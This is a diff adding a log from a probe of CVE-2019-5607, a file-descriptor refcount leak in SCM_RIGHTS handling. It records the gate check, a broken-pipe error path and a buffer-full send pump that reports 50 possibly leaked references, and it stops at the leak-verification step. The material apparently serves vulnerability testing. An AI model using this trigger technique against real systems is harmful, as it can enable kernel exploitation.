@@ -1,0 +1,26 @@
+=== PROBE 89a: CVE-2019-5607 FD REFCOUNT RACE ===
+Section: A
+
+pid=957
+--- SECTION A: SCM_RIGHTS gate + error path ---
+
+  socketpair ret=0 fds=[23,24]
+  target fd=25
+  [1] gate send ret=1
+  gate recv fd=27 (ok)
+  *** GATE PASSED ino=0x10000C1B6 ***
+
+  [2] broken-pipe error path
+  closed receiver, pumping on broken pipe...
+  500 sends: ok=0 fail=500
+  VM: 3490 → 3490 d=0
+
+  [3] buffer-full SCM_RIGHTS pump
+  SO_RCVBUF=1
+  pump: ok=128 fail=50 first_fail_at=129
+  VM: 3490 → 3490 d=0
+  *** 50 sends failed after fhold (CVE trigger?) ***
+  fhold refs leaked = 50 (if CVE present)
+  drained 128 fds (sent 128)
+
+  [4] LEAK VERIFICATION
